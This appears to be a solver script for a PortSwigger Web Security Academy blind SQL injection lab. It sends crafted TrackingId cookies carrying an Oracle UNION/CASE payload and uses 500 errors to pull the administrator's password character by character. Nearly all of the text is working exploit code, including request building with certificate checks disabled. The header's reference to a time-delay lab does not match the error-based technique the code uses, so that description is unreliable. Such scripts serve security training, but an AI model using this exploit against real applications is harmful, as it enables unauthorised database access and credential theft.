#!/usr/bin/env python3
# portswigger academy blind delay-based sqli
# https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
# U+0A75
import socket, ssl
import re, string

target_host = "whateverwhatever.web-security-academy.net"
target_port = 443

# handle large responses
def recvall(sock):
    BUFF_SIZE = 4096 # 4 KiB
    data = b''
    while True:
        part = sock.recv(BUFF_SIZE)
        if not part: # no more data
            break
        data += part
    return data

def build_http(injection):
    req = ""
    req += "GET / HTTP/1.0\r\n"
    req += "Host: {host}\r\n".format(host=target_host)
    req += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
    req += "Connection: close\r\n"
    req += "Cookie: TrackingId={}\r\n".format(injection)
    req += "\r\n"
    return req

def send_https(req):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s = context.wrap_socket(sock)
    s.connect((target_host, target_port))
    s.send(req.encode())
    response = recvall(s).decode()
    return response

reg_negative = re.compile("500 Internal Server Error") # indicate negative result

word = ""
pos = 1     # starting character

while True:
    for char in string.printable:

        # syntax is Oracle SQL
        query = "SUBSTR((select password from users where username='administrator'), {pos}, 1)='{ch}'".format(pos=pos,ch=char)
        error_query = "union select CASE WHEN ({}) THEN to_char(1/0) ELSE NULL END FROM DUAL".format(query)
        tracking_id = "123' {}-- -".format(error_query)

        req = build_http(tracking_id)
        res = send_https(req)

        if reg_negative.findall(res):
            #print("[-] negative:", char)

            word += char
            pos = pos + 1
            break
        else:
            #print("[+] positive:", char)
            continue

    print(word)